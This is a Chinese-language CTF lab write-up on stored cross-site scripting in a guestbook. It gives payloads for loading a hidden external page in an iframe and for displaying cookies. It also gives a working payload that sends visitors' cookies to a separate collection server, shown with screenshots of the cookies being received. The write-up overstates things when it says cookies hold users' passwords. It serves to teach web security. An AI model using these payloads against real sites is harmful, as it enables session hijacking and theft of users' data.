# CTF - XSS跨站脚本攻击

[TOC]

## XSS跨站漏洞利用

### 利用XSS跨站漏洞加载恶意网页

将恶意网页（假设`http://www.heetian.com`）放入留言系统数据库，并在用户端执行；

1. 增加一留言，并在留言内容中改为 `<iframe src="http://www.heetian.com"></iframe>`，测试返回效果。

   ![image-20200823180011273](image\image-20200823180011273.png)

   ![158](image\6266eea1-494b-4ee9-bb5e-449af8ee0c88.png)

2. 隐藏恶意网页。

   增加留言，内容包含以下语句：`<iframe src=http://www.baidu.com width="0" height="0"></iframe>`，观察返回状态，网页被执行，但未在留言系统界面中显示。这样如果是攻击脚本就可以用此方法隐藏自己。



### 利用XSS跨站漏洞窃取用户cookie

1. 添加留言，包含以下内容：`<script>document.write(document.cookie)</script>`

   结果如图所示：

      ![159](image\9fc9bb1c-c181-4051-99ac-fcd038cd4542.png)

2. 添加留言，包含以下内容：`<script>alert(document.cookie)</script>`

   观察显示的cookie有什么不同？

      ![img](image\3559096b-6323-488e-a349-41a55ea11944.jpg)

3. 搭建WEB服务器，以便进一步保存浏览用户的cookie。

   添加留言，包含以下内容：`<script>document.write("<iframe width=0 height=0 src='http://10.1.1.78/cookie.asp?cookie="+document.cookie+"'></iframe>");</script>`

      ![164](image\c72f833f-e10e-424d-adb7-151a49e19612.png)

4.  提交留言后观察目标服务器页面，没有看到异常现象，如下图所示：

     ![165](image\72a8b172-63ae-4ea4-ac35-191518cada89.png)

   再打开本地页面，查看接收浏览用户的cookie接收情况：

      <img src="image\765d19f7-c6a4-487f-9ceb-de269574aea4.png" alt="img"  />

   可以看到，已经接收到用户的cookie了，这些cookie包含了所有浏览该页面的信息，如果是登录用户的话，cookie包含了用户的用户名与密码信息。